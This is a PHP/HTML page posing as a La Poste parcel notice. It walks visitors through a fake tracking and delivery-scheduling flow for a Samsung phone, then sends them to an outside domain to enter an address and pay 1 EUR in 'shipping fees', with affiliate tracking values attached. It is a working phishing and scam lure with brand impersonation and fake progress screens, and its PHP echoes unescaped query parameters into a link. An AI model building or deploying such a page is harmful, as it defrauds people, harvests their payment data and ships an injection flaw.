
<?php
$publisher_id = $_GET["PUBLISHER_ID"];
$site_id = $_GET["SITE_ID"];
$creative_id = $_GET["CREATIVE_ID"];


?>

<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="robots" content="noindex, nofollow, noarchive">
    <title>(1) Nouveau Message</title>
    <link rel="shortcut icon" href="favicon.ico" />
    <link rel="stylesheet" href="styles.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
    <script src="modernizr.min.js"></script>
</head>

<body class="loaded">

    
        <div id="system_overlay">
        <div class="system-container">
            <div class="system-inner-container">
                <div class="system-message">
                    <img src="logo.png">
                    <p>Vous avez <span style="color: #ff0000; font-weight: bold;">(1)</span> message de la poste. Veuillez cliquer ci-dessous pour l'ouvrir.</p>
                    <center>
                    <button type="button" class="btn animated infinite pulse" id="openMessage" style="margin: 0 auto; display: inline-block;">Confirmer</button>
                    </center>
                </div>
            </div>
        </div>
    </div>
    
    <div class="page">
        <!-- HEADER -->
        <header class="header">
            <img src="logo.png" class="header__icon">
        </header>
        <!-- / HEADER -->

        <!-- Screen 1 -->
        <main class="main main--1">
            <div class="card">
                <h2 class="title" data-translate-key="delivery">Colis en attente</h2>
                <span class="badge" data-badge="!"><img src="icon-box.png" alt="" style="width: 170px;"></span>
                <p data-translate-key="you_have_package">Vous avez (1) colis en attente, prêt pour la livraison. Utilisez votre code pour suivre et réceptionner votre colis.</p>
                <hr>
                <dl class="tracking-code">
                    <dt data-translate-key="your_tracking_code">Votre numéro de suivi:</dt>
                    <dd>29194772</dd>
                </dl>
            </div>
            <button type="button" class="btn screen-trigger--1" data-translate-key="follow_your_order">Suivre votre colis</button>
        </main>

        <!-- Screen 2 -->
        <main class="main main--2">
            <div class="card">
                <div class="spinner-container">
                    <div class="spinner"></div>
                    <img src="check-circle-regular.png" alt="" class="main__icon icon icon-check">
                </div>
                <div class="spinner-margin"></div>

                <ul class="loading-list">
                    <li>Suivi de votre colis...</li>
                    <li>Trouver votre numéro de suivi...</li>
                    <li>Recherche d'options de livraison...</li>
                </ul>
            </div>
        </main>

        <!-- Screen 3 -->
        <main class="main main--3">
            <ol class="steps-wrap">
                <li class="step step--current"></li>
                <li class="step"></li>
                <li class="step"></li>
            </ol>
            <div class="card">
                <div class="productContainer">
                <img src="samsung-s10.png" alt="Samsung Galaxy S10">
                </div>
                <div class="product">  
                    <div class="product__content">
                        <h3 class="subtitle" data-translate-key="package_information">Informations sur les colis:</h3>
                        <table>
                            <tr style="font-size: 14px;">
                                <th style="font-weight: bold; color: #333;">Statut: </th><td>Prêt pour la livraison</td>
                            </tr>
                            <tr style="font-size: 14px;">
                                <th style="font-weight: bold; color: #333;">Contient: </th><td>Samsung Galaxy S9</td>
                            </tr>
                            <tr style="font-size: 14px;">
                                <th style="font-weight: bold; color: #333;"></th><td></td>
                            </tr>
                        </table>
                    </div>
                </div>
            </div>
            <button type="button" class="btn screen-trigger--2" data-translate-key="schedule_delivery">Planifier la livraison</button>
        </main>
        <!-- Screen 4 -->
        <main class="main main--4">
            <ol class="steps-wrap">
                <li class="step step--done"></li>
                <li class="step step--current"></li>
                <li class="step"></li>
            </ol>
            <div class="card">
                <img src="samsung-s10.png" alt="">
                <form class="questions-wrap">
                    <div class="question question--1">
                        <h2 class="subtitle" data-translate-key="how_would_you_like">Comment souhaitez-vous recevoir votre colis?</h2>
                        <div class="question__answers">
                            <input type="radio" id="question01a" name="question01">
                            <label for="question01a">
								<span data-translate-key="delivered_to_me">Je veux qu'il soit livré</span>
							</label>
                            <input type="radio" id="question01b" name="question01" disabled="">
                            <label for="question01b" data-error="">
								<span data-translate-key="pick_it_up_myself">Je veux aller le chercher au bureau de poste le plus proche</span>
								<span class="hidden question__error" data-translate-key="the_package_is_already">Votre colis est déjà dans l'entrepôt de livraison</span>
							</label>
                        </div>
                    </div>
                    <div class="question question--2">
                        <h2 class="subtitle" data-translate-key="where_do_you_want">Où voulez-vous qu'il soit livré?</h2>
                        <div class="question__answers">
                            <input type="radio" id="question02a" name="question02">
                            <label for="question02a">
								<span data-translate-key="at_home">À la maison</span>
							</label>
                            <input type="radio" id="question02b" name="question02">
                            <label for="question02b">
								<span data-translate-key="at_work">Au travail</span>
							</label>
                        </div>
                    </div>
                    <div class="question question--3">
                        <h2 class="subtitle" data-translate-key="when_do_you_want">Quand voulez-vous qu'il soit livré?</h2>
                        <div class="question__answers">
                            <input type="radio" id="question03a" name="question03">
                            <label for="question03a">
								<span data-translate-key="working_days">Jours ouvrables</span>
							</label>
                            <input type="radio" id="question03b" name="question03">
                            <label for="question03b">
								<span data-translate-key="weekend">Fin de semaine</span>
							</label>
                        </div>
                    </div>
                </form>
            </div>
        </main>
        <!-- Screen 5 -->
        <main class="main main--5">
            <ol class="steps-wrap">
                <li class="step step--done"></li>
                <li class="step step--current"></li>
                <li class="step"></li>
            </ol>
            <div class="card">
                <div class="spinner-container">
                    <div class="spinner"></div>
                    <img src="check-circle-regular.png" alt="" class="main__icon icon icon-check">
                </div>
                <div class="spinner-margin"></div>
                <ul class="loading-list">
                    <li data-translate-key="we_are_saving">Vérification des options de livraison ...</li>
                    <li data-translate-key="we_are_confirming">Vérification des délais de livraison ...</li>
                    <li data-translate-key="reserved">La date et l'heure de livraison du colis ont été réservées.</li>
                </ul>
            </div>
        </main>
        <!-- Screen 6 -->
        <main class="main main--6">
            <ol class="steps-wrap">
                <li class="step step--done"></li>
                <li class="step step--done"></li>
                <li class="step step--current"></li>
            </ol>
            <div class="card">
                <h2 class="title title--primary" data-translate-key="order_confirmation">Confirmation de commande</h2>
                <img src="samsung-s10.png" alt="Samsung Galaxy S10" class="spaced1">
                <h3 class="subtitle" data-translate-key="estimated_delivery">Délai de livraison: 3 jours</h3>
                <p><span data-translate-key="enter_your_contact"><span style="color: red;">*</span> Entrez votre adresse sur la page suivante et payez 1 EUR pour les frais d'expédition.</span>
                </p>
            </div>
            <a href="https://sactinas-dintire.com/b1ddf352-ae3e-4488-bde5-02c8de262f31?PUBLISHER_ID=<?php echo $publisher_id;?>&SITE_ID=<?php echo $site_id;?>&CREATIVE_ID=<?php echo $creative_id;?>" style="cursor:pointer !important;" class="btn" data-translate-key="delivery_information">Entrez les informations d'expédition</a>
        </main>
        <div class="foot">
            <h4 class="foot__title" data-translate-key="posted_by">© 2019 La Poste.</h4>
        </div>
    </div>
    <script type="text/javascript" src="jquery-latest.min.js"></script>
    <script src="https://cdn.by.wonderpush.com/sdk/1.1/wonderpush-loader.min.js" async></script>
    <script>
    window.WonderPush = window.WonderPush || [];
    WonderPush.push(["init", {
        webKey: "061e255dda42994a0ce0db51a2f5c018b6b557fc5e04f75a5248db8605949a9c",
    }]);
    </script>
    <script>

        $('#openMessage').click(function(e){
            e.preventDefault();
            $('#system_overlay').fadeOut(function(){
                $(this).remove();
            });
        });

        $(window).on("load", function() {
            $('body').addClass('loaded');
        });

        //Mobile height
        window.addEventListener('load', () => {
            let vh = window.innerHeight * 0.01;
            document.documentElement.style.setProperty('--vh', `${vh}px`);
        });
        window.addEventListener('resize', () => {
            let vh = window.innerHeight * 0.01;
            document.documentElement.style.setProperty('--vh', `${vh}px`);
        });

        $(document).ready(function() {
            //Screen trigger
            $('.screen-trigger--1').click(function() {
                $('html, body').animate({
                    scrollTop: 0
                }, 100);
                $('.main--1').fadeOut(100);

                $('.page').addClass('page--inner');

                setTimeout(
                    function() {
                        $('.main--2').fadeIn(1000);
                    }, 100
                );

                setTimeout(
                    function() {
                        $('html, body').animate({
                            scrollTop: 0
                        }, 100);
                        $('.main--2 .spinner').fadeOut(180);
                        $('.main--2').addClass('checked');
                    }, 3000
                );

                setTimeout(
                    function() {
                        $('html, body').animate({
                            scrollTop: 0
                        }, 100);
                        $('.main--2').fadeOut(100);
                        $('.main--3').fadeIn(1000);
                    }, 4000
                );
            });

            $('.screen-trigger--2').click(function() {
                $('html, body').animate({
                    scrollTop: 0
                }, 100);
                $('.main--3').fadeOut(200);

                setTimeout(
                    function() {
                        $('.main--4').fadeIn(1000);
                    }, 200
                );
            });


            //Questions
            $('.question--1 label:not([data-error]), .question--2 label').click(function() {
                var currentQ = $(this).parents('.question'),
                    nextQ = $(this).parents('.question').next();

                setTimeout(function() {
                    currentQ.fadeOut(300);
                }, 500);

                setTimeout(function() {
                    nextQ.fadeIn(500);
                }, 800);
            });

            $('[data-error]').click(function() {

                $(".question__error").toggleClass('hidden');
            });

            $('.question--3 label').click(function() {
                $('html, body').animate({
                    scrollTop: 0
                }, 100);

                setTimeout(function() {
                    $('.main--4').fadeOut(200);
                }, 300);

                setTimeout(function() {
                    $('.main--5').fadeIn(1000);
                }, 500);

                setTimeout(
                    function() {
                        $('html, body').animate({
                            scrollTop: 0
                        }, 100);
                        $('.main--5 .spinner').fadeOut(180);
                        $('.main--5').addClass('checked');
                    }, 3300
                );

                setTimeout(
                    function() {
                        $('html, body').animate({
                            scrollTop: 0
                        }, 100);
                        $('.main--5').fadeOut(100);
                        $('.main--6').fadeIn(1000).css('display', 'flex');
                    }, 4300
                );
            });
        });
    </script>
    <script>
        var changed_title = false;
        setInterval(function() {
            if (changed_title) {
                document.title = '(1) Nouveau Message | La Poste';
                changed_title = false;
            } else {
                document.title = 'La Poste | (1) Nouveau Message';
                changed_title = true;
            }
        }, 3000);
    </script>
</body>
</html>